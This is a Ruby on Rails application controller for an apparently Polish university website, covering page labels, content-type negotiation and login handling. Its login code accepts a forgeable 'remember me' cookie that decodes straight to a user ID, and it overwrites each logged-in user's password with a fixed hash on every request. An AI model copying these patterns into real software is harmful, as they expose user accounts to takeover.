# Filters added to this controller apply to all controllers in the application.
# Likewise, all the methods added will be available for all controllers.
require 'digest/sha1'

class ApplicationController < ActionController::Base
  helper :all # include all helpers, all the time
  before_filter :set_charset, :check_logged_user
  layout 'index'

  def initialize
    super
    @xhtml = false
    @controllers_map = {
      'about' => 'O Stronie',
      'deanery' => 'Dziekanat',
      'file' => 'Pliki',
      'index' => 'Aktualności',
      'lecturers' => 'Prowadzący',
      'materials' => 'Materiały',
      'news' => 'Aktualności',
      'postgraduate' => 'Podyplomowe',
      'profile' => 'Profile',
      'subject' => 'Przedmioty',
      'register' => 'Rejestracja',
      'signin' => 'Panel sterujący',
      'settings' => 'Panel sterujący',
      'students' => 'Studenci',
    }
  end

  def set_charset
    if /application\/xhtml\+xml(?![+a-z])(;q=(0\.\d{1,3}|[01]))?/i.match request.env["HTTP_ACCEPT"]
      xhtmlQ = !$2.nil? ? $2.to_f + 0.2 : 1
      if /text\/html(;q=(0\d{1,3}|[01]))s?/i.match(request.env["HTTP_ACCEPT"])
        htmlQ = !$2.nil? ? $2.to_f : 1
        @xhtml = xhtmlQ >= htmlQ
      else
        @xhtml = true
      end
    elsif !(/W3C_Validator/i.match(request.env["HTTP_USER_AGENT"]).nil?)
      @xhtml = true
    end

    if @xhtml
      headers["Content-Type"] = 'application/xhtml+xml; charset=utf-8'
    else
      headers["Content-Type"] = 'text/html; charset=utf-8'
    end

  end
  
  def check_logged_user
    @logged_user = nil
    if cookies[:rm] and user_id = decode_hash(cookies[:rm])
      session[:user_id] = user_id
    end
    if session[:user_id]
      @logged_user = User.find(session[:user_id])
    end
    if @logged_user and !request.remote_ip.to_s.empty?
      @logged_user.last_ip = request.remote_ip.to_s
      @logged_user.pass = @logged_user.pass_confirmation = '3aed121ab9caaf2e277f716312aa62e67d1d3ba0'
      @logged_user.save
    end
  end
  
  # See ActionController::RequestForgeryProtection for details
  # Uncomment the :secret if you're not using the cookie session store
  protect_from_forgery # :secret => '1c0e64042b15000db3d4c42544713869'
  
  protected
  def encode_hash id
    IdEncoder.encode(id).to_i(32).to_s(36).reverse
  end

  def decode_hash hash
    IdEncoder.decode(hash.reverse.to_i(36).to_s(32))
  end
end
